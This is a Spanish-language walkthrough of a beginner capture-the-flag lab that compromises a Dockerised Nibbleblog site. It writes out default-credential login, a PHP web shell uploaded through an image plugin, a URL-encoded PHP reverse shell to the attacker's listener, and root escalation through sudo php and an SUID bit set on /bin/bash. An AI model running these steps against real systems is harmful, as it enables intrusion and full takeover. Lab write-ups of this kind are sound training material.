---
Maquina: Cchocolateloversp
SO: Linux
Explotación: Análisis de web
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - web_discovery
  - linux
  - escala_privs
  - web
  - nibbleblog
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sS -Pn 172.17.0.2
```

![[Pasted image 20241029181534.png]]

2. **Ver la pagina web ubicada en el puerto 80**:

![[Pasted image 20241029181556.png]]

Como se puede apreciar es la página por defecto de apache. Vamos a intentar ver si hay alguna web adicional.

Si investigamos el código fuente podemos observar que tienen un nibbleblog instalado.

![[Pasted image 20241029181644.png]]

Y si nos adentramos podemos observar el panel principal de Nibbleblog

![[Pasted image 20241029181724.png]]

Podemos intentar iniciar sesión en el panel. Pero no nos sabemos las credenciales... Vamos a probar con las tipicas de admin:admin ->

![[Pasted image 20241029181825.png]]

Parece que estamos dentro...

![[Pasted image 20241029181846.png]]

Vamos a ver si podemos instalar algún plugin que tenga vulnerabilidades...

![[Pasted image 20241029181922.png]]

Parece que podemos instalar el plugin de myimage... sería una pena poner un código malicioso en vez de una imágen, se me ocurre un código como este ->

```php
<?php
if (isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
```

Que nos permita ver si ejecutamos algún comando, y vaya parece que lo ha pillado bien.

![[Pasted image 20241029182135.png]]

Ahora podríamos intentar pasar comandos por url tal que así ->

![[Pasted image 20241029182205.png]]

Y si intentamos pasar una reverse shell?

Para ello nos ponemos a la escucha:

```bash
nc -lvnp 4444
```

Y por otro lado le pasamos a la URL el comando códificado -> php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.1%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Y listo, ya tenemos acceso a la bash de www-data

![[Pasted image 20241029182416.png]]

Nos queda hacer el proceso para upgradear la tty.

![[Pasted image 20241029184404.png]]

Listo, ahora vamos a pasar a ver nuestros permisos con sudo -l

![[Pasted image 20241029184446.png]]

Parece que podemos utilizar php como usuario chocolate, asi que vamos a pasar a ese usuario.

```bash
CMD="/bin/sh"
sudo -u chocolate php -r "posix_setuid(0); system('$CMD');"
```

![[Pasted image 20241029184622.png]]

Si ejecutamos el comando que nos permite ver los procesos en ejecución como root podemos observar algo interesante -> ps aux | grep root

![[Pasted image 20241029185718.png]]

Resulta que está ejecutando un proceso curioso -> sudo -u chocolate php -r posix_setuid(0); system('/bin/sh');

Si nos fijamos en el /opt/script.php somos propiertarios del archivo.

![[Pasted image 20241029185852.png]]

Vamos a intentar modificarlo para meterle una línea de código maliciosa

```bash
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

Tras esperar un poco asignamos el bit de superusuario al /bin/bash

![[Pasted image 20241029190231.png]]

Con lo que ya podemos ejecutar un bash como root sin necesidad de passwd

![[Pasted image 20241029190301.png]]

